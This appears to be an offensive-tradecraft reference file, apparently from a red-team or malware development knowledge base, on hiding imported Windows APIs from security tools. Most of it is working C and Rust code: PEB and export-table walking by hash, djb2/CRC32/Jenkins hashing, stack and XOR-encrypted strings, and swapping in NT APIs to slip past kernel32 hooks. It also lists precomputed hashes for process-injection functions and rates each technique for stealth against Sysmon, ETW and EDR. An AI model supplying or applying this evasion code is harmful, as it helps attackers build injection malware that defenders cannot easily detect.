# API Resolution & IAT Hiding

> OPSEC: 🟢 Low (all techniques in this file)
> Sysmon: N/A — no events for PEB/export table reads
> ETW: N/A — in-process memory reads only
> EDR Hooks: N/A — reads process's own PEB and loaded module memory
> Signature: No suspicious API names in IAT; dynamic resolution at runtime
> Mitigation: Already optimal; combine with stack strings or encrypted strings for maximum stealth

## PEB Walk - Custom GetModuleHandle

```c
// Custom LDR entry (winternl.h incomplete definition)
typedef struct _MY_LDR {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR;

HMODULE GetModuleByHash(DWORD dwHash) {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &pPeb->Ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        MY_LDR* l = CONTAINING_RECORD(e, MY_LDR, InMemoryOrderLinks);
        if (l->BaseDllName.Buffer) {
            wchar_t upper[256] = {0};
            for (USHORT i = 0; i < l->BaseDllName.Length/2 && i < 255; i++) {
                wchar_t c = l->BaseDllName.Buffer[i];
                upper[i] = (c >= L'a' && c <= L'z') ? c - 32 : c;
            }
            if (Djb2HashW(upper) == dwHash) return (HMODULE)l->DllBase;
        }
    }
    return NULL;
}
// KERNEL32.DLL djb2w hash = 0x6DDB9555
// NTDLL.DLL djb2w hash = 0x1EDAB0ED
```

## Export Table Walk - Custom GetProcAddress

```c
FARPROC GetProcByHash(HMODULE hMod, DWORD dwHash) {
    PBYTE pBase = (PBYTE)hMod;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD pNames = (PDWORD)(pBase + pExp->AddressOfNames);
    PDWORD pFuncs = (PDWORD)(pBase + pExp->AddressOfFunctions);
    PWORD  pOrds  = (PWORD)(pBase + pExp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        char* name = (char*)(pBase + pNames[i]);
        if (Djb2Hash(name) == dwHash)
            return (FARPROC)(pBase + pFuncs[pOrds[i]]);
    }
    return NULL;
}
```

## Hash Algorithms

### Djb2 (runtime + compile-time)
```c
constexpr DWORD Djb2Compile(const char* s) {
    DWORD h = 5381;
    while (*s) h = ((h << 5) + h) + (unsigned char)*s++;
    return h;
}
__forceinline DWORD Djb2Hash(const char* s) {
    DWORD h = 5381; int c;
    while ((c = *s++)) h = ((h << 5) + h) + c;
    return h;
}
```

### CRC32
```c
DWORD Crc32Hash(const char* s) {
    DWORD c = 0xFFFFFFFF;
    while (*s) {
        c ^= (unsigned char)*s++;
        for (int j = 0; j < 8; j++)
            c = (c >> 1) ^ (0xEDB88320 & (-(c & 1)));
    }
    return ~c;
}
```

### JenkinsOneAtATime32
```c
UINT32 JenkinsHash(PBYTE data, SIZE_T len) {
    UINT32 hash = 0;
    for (SIZE_T i = 0; i < len; i++) {
        hash += data[i];
        hash += hash << 10;
        hash ^= hash >> 6;
    }
    hash += hash << 3;
    hash ^= hash >> 11;
    hash += hash << 15;
    return hash;
}
```

## IAT Hiding Techniques

### 1. Constexpr Hash (compile-time)
```c
// Hash computed at compile time — zero strings in binary
auto f = (tVirtualAllocEx)GetProcByHash(hK32, Djb2Compile("VirtualAllocEx"));
```

### 2. Stack Strings (no .rdata strings)
```c
char s[] = {'V','i','r','t','u','a','l','A','l','l','o','c','E','x',0};
auto f = (tVirtualAllocEx)GetProcAddress(hK32, s);
```

### 3. XOR-Encrypted Strings
```c
// Encrypted at build time, decrypted at runtime
static char enc[] = {0x61,0x5E,...}; // "VirtualAllocEx" ^ 0x37
char dec[64]; XorStr(dec, enc, 14, 0x37);
auto f = (tVirtualAllocEx)GetProcByHash(hK32, Djb2Hash(dec));
```

### 4. Dispatch Table (indirect calls)
```c
struct VT { void* slots[6]; };
// Populate: t.slots[0] = (void*)GetProcByHash(hK32, hash);
// Call: ((tCreateProcessA)api.slots[0])(NULL, tgt, ...);
```

### 5. NT API Only (bypass kernel32 hooks)
```c
// Use ntdll equivalents directly
NtAllocateVirtualMemory  // instead of VirtualAllocEx
NtWriteVirtualMemory     // instead of WriteProcessMemory
NtQueueApcThread         // instead of QueueUserAPC
NtResumeThread           // instead of ResumeThread
NtClose                  // instead of CloseHandle
```

## Rust Export Table Walk
```rust
unsafe fn proc_djb2(module: *const u8, hash: u32) -> *const u8 {
    let e_lfanew = *(module.add(0x3C) as *const u32) as usize;
    let nt = module.add(e_lfanew);
    let export_rva = *(nt.add(0x88) as *const u32) as usize;
    if export_rva == 0 { return std::ptr::null(); }
    let exp = module.add(export_rva);
    let num = *(exp.add(0x18) as *const u32) as usize;
    let names = module.add(*(exp.add(0x20) as *const u32) as usize) as *const u32;
    let funcs = module.add(*(exp.add(0x1C) as *const u32) as usize) as *const u32;
    let ords = module.add(*(exp.add(0x24) as *const u32) as usize) as *const u16;
    for i in 0..num {
        let np = module.add(*names.add(i) as usize);
        let mut h: u32 = 5381;
        let mut p = np;
        while *p != 0 { h = h.wrapping_mul(33).wrapping_add(*p as u32); p = p.add(1); }
        if h == hash { return module.add(*funcs.add(*ords.add(i) as usize) as usize); }
    }
    std::ptr::null()
}
```

## Important Hash Values (Djb2)
- KERNEL32.DLL (wide uppercase): `0x6DDB9555`
- NTDLL.DLL (wide uppercase): `0x1EDAB0ED`
- CreateProcessA: `0xAEB52E19`
- VirtualAllocEx: `0xF36E5AB4`
- WriteProcessMemory: `0x6F22E8C8`
- QueueUserAPC: `0x76C0C4BD`
- ResumeThread: `0x74162A6E`
- CloseHandle: `0x3870CA07`
- OpenProcess: `0x7136FDD6`
- NtAllocateVirtualMemory: `0xE0762FEB`
- NtWriteVirtualMemory: `0xAB0C9E28`
- NtQueueApcThread: `0x6957E836`
- NtResumeThread: `0xECB4F038`
- NtClose: `0x2DC3DF28`
